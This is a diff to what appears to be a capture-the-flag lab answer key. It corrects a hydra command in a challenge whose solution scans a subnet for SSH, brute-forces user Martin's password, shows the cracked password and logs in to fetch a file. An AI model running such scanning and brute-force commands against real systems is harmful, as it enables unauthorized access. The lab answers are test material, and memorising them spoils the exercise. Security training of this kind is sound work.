@@ -324,7 +324,7 @@ Answer: Apache
 **Challenge** 5:
 You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the folders present on the Desktop to find the target file) (Format: aNaa**NNNNNAA*)
 - nmap -p 22 192.168.10.0/24 --open
-- hydra -l Martin -P password.txt 192.168.10.101
+- hydra -l Martin -P password.txt 192.168.10.101 ssh
 - Password: qwerty1234
 - ssh Martin@192.168.10.101   enter password and get the file
 cd Desktop
